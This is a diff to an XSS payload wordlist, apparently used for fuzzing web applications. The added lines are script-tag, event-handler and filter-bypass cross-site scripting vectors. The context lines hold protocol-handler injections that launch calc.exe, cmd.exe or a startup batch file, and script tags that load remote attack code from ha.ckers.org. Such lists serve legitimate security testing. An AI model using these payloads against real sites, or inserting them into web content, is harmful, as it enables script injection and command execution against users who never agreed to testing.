@@ -1,4 +1,28 @@
 '';!--"<XSS>=&{()}
+\"><script>alert(0x000123)</script>
+\"><sCriPt>alert(0x000123)</sCriPt>
+\"; alert(0x000123)
+\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>
+\"><img Src=0x94 onerror=alert(0x000123)>
+\"><BODY ONLOAD=alert(0x000123)>
+'%2Balert(0x000123)%2B'
+\"><0x000123>
+'+alert(0x000123)+'
+%2Balert(0x000123)%2B'
+'\"--></style></script><script>alert(0x000123)</script>
+'</style></script><script>alert(0x000123)</script>
+</script><script>alert(0x000123)</script>
+</style></script><script>alert(0x000123)</script>
+%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C
+'\"--></style></script><script>alert(0x000123)</script>
+';alert(0x000123)'
+<scr<script>ipt>alert(0x000123)</script>
+<scr<script>ipt>alert(0x000123)</scr</script>ipt>
+\"<scr<script>ipt>alert(0x000123)</scr</script>ipt>
+\"><scr<script>ipt>alert(0x000123)</script>
+\">'</style></script><script>alert(0x000123)</script>
+\"></script><script>alert(0x000123)</script>
+\"></style></script><script>alert(0x000123)</script>  
 aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
 firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
 navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
@@ -186,15 +210,15 @@ a="get";
 <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-XSS - Basic ##<script>alert(1234)</script>##1
-XSS - Basic without alert##<script>prompt(1234)</script>##1
-XSS - Basic Obfuscation##<ScripT>alert(1234)</ScRipT>##1
-XSS - Basic on URL##/<script>alert(1234)</script>##0
-XSS - Basic ##<script>var m=<html><a href="//host">link</a>##1
-XSS - without script tag -1##<img+src="http://localhost">##1
-XSS - without script tag -2##<DIV+STYLE="background-image: url(javascript:alert(1))">##1
-XSS - without script tag -3##<IMG+DYNSRC="javascript:alert(1);">##1
-XSS - without script tag -4##<IMG+LOWSRC="javascript:alert(1);">##1
+<script>alert(1234)</script>
+<script>prompt(1234)</script>
+<ScripT>alert(1234)</ScRipT>
+/<script>alert(1234)</script>
+<script>var m=<html><a href="//host">link</a>
+<img+src="http://localhost">
+<DIV+STYLE="background-image: url(javascript:alert(1))">
+<IMG+DYNSRC="javascript:alert(1);">
+<IMG+LOWSRC="javascript:alert(1);">##1
 XSS - without script tag -5##<isindex+type=image+src=1+onerror=alert(1)>##1
 XSS - without script tag -6##<meta style="xss:expression(open(alert(1)))" />##1
 XSS - without script tag -7##<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1);\">##1
